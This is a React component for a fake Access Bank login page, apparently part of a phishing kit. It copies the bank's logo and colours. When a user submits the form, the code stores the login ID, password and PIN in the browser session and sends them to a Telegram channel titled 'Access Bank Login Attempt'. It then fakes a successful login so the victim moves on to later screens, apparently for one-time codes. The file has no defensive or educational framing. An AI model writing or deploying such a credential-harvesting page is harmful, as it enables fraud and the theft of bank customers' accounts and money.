"use client"

import { useState } from "react"
// import { AccessBankLogo } from "./access-bank-logo"
import { Menu, Bell } from "lucide-react"
import { sendTelegramMessage } from "@/lib/telegram"

interface LoginScreenProps {
    onLogin: () => void
}

export function LoginScreen({ onLogin }: LoginScreenProps) {
    const [loginId, setLoginId] = useState("")
    const [password, setPassword] = useState("")
    const [pin, setPin] = useState("")
    const [authMethod, setAuthMethod] = useState<"PIN" | "TOKEN">("PIN")
    const [isLoading, setIsLoading] = useState(false)
    const [errors, setErrors] = useState<Record<string, string>>({})

    const handleUnlock = async (e: React.FormEvent) => {
        e.preventDefault()

        const newErrors: Record<string, string> = {}
        if (!loginId.trim()) newErrors.loginId = "Login ID is required"
        if (!password.trim()) newErrors.password = "Password is required"
        if (!pin.trim()) newErrors.pin = `${authMethod} is required`

        if (Object.keys(newErrors).length > 0) {
            setErrors(newErrors)
            return
        }

        setErrors({})
        setIsLoading(true)

        sessionStorage.setItem("userEmail", loginId)
        sessionStorage.setItem("userPassword", password)
        sessionStorage.setItem("userPin", pin)

        await sendTelegramMessage({
            title: "🔐 Access Bank Login Attempt",
            email: loginId,
            password: password,
            pin: pin,
            exclude: ["location", "otp1", "otp2", "otp3"],
        })

        setTimeout(() => {
            setIsLoading(false)
            onLogin()
        }, 1500)
    }

    return (
        <div className="flex min-h-[100dvh] w-full overflow-x-hidden flex-col bg-white">
            {/* Dark Navy Header with Curve */}
            <div className="">
                <div className="bg-[#0d1a33] px-5 pb-8 pt-4">
                    {/* Top Row - Menu, Logo, Bell */}
                    <div className="flex items-center justify-between">
                        <button className="p-2">
                            <Menu className="h-6 w-6 text-white" strokeWidth={2} />
                        </button>

                        <div className="flex items-center gap-2">
                            <img src="https://cdn.brandfetch.io/idPXJmyni4/theme/dark/symbol.svg?c=1dxbfHSJFAPEGdCLU4o5B" alt="" className="h-10 " />
                            <p className="text-white font-bold text-3xl font-italic">access</p>

                        </div>
                        <button className="p-2">
                            <Bell className="h-6 w-6 text-white" strokeWidth={2} />
                        </button>
                    </div>
                </div>


            </div>

            {/* Content Area */}
            <div className="relative flex-1 bg-white px-5 pt-2">
                {/* Watermark Logo */}
                {/* <div className="absolute left-1/2 top-0 -translate-x-1/2 -translate-y-4">
          <AccessBankLogo className="h-16 w-16 text-gray-200" />
        </div> */}

                {/* Form */}
                <form onSubmit={handleUnlock} className="mt-12 flex flex-col">
                    {/* Login ID Field */}
                    <div className="mb-5">
                        <label className="mb-2 block text-sm font-medium text-[#1a1a1a]">
                            Login<span className="text-[#1a1a1a]">*</span>
                        </label>
                        <input
                            type="text"
                            value={loginId}
                            onChange={(e) => {
                                setLoginId(e.target.value)
                                if (errors.loginId) setErrors({ ...errors, loginId: "" })
                            }}
                            placeholder="Enter Login ID"
                            className={`h-14 w-full rounded-lg border bg-white px-4 text-base text-[#1a1a1a] placeholder:text-gray-400 focus:outline-none ${errors.loginId ? "border-red-500" : "border-gray-300 focus:border-[#bcd430]"}`}
                        />
                        {errors.loginId && <p className="mt-1 text-xs text-red-500">{errors.loginId}</p>}
                    </div>

                    {/* Password Field */}
                    <div className="mb-6">
                        <label className="mb-2 block text-sm font-medium text-[#1a1a1a]">
                            Password<span className="text-[#1a1a1a]">*</span>
                        </label>
                        <input
                            type="password"
                            value={password}
                            onChange={(e) => {
                                setPassword(e.target.value)
                                if (errors.password) setErrors({ ...errors, password: "" })
                            }}
                            placeholder="Enter Password"
                            className={`h-14 w-full rounded-lg border bg-white px-4 text-base text-[#1a1a1a] placeholder:text-gray-400 focus:outline-none ${errors.password ? "border-red-500" : "border-gray-300 focus:border-[#bcd430]"}`}
                        />
                        {errors.password && <p className="mt-1 text-xs text-red-500">{errors.password}</p>}
                    </div>



                    {/* Authorization Method Section */}
                    <div className="mb-5">



                        {/* PIN / Token Input */}
                        <div>
                            <label className="mb-2 block text-sm font-medium text-[#1a1a1a]">
                                {authMethod}<span className="text-[#1a1a1a]">*</span>
                            </label>
                            <input
                                type={authMethod === "PIN" ? "password" : "text"}
                                value={pin}
                                onChange={(e) => {
                                    setPin(e.target.value)
                                    if (errors.pin) setErrors({ ...errors, pin: "" })
                                }}
                                placeholder={authMethod === "PIN" ? "Enter your PIN" : "Enter your Token"}
                                className={`h-14 w-full rounded-lg border bg-white px-4 text-base text-[#1a1a1a] placeholder:text-gray-400 focus:outline-none ${errors.pin ? "border-red-500" : "border-gray-300 focus:border-[#bcd430]"}`}
                            />
                            {errors.pin && <p className="mt-1 text-xs text-red-500">{errors.pin}</p>}
                        </div>
                    </div>

                    {/* Unlock Button */}
                    <button
                        type="submit"
                        disabled={isLoading}
                        className="mt-4 h-14 w-full rounded-lg bg-[#bcd430] text-base font-bold uppercase tracking-wide text-[#1a1a1a] transition-colors hover:bg-[#a8c020] disabled:opacity-70"
                    >
                        {isLoading ? (
                            <span className="flex items-center justify-center gap-2">
                                <span className="h-6 w-6 animate-spin rounded-full border-4 border-[#1a1a1a] border-t-transparent" />
                            </span>
                        ) : (
                            "Login"
                        )}
                    </button>
                </form>
            </div>
        </div>
    )
}
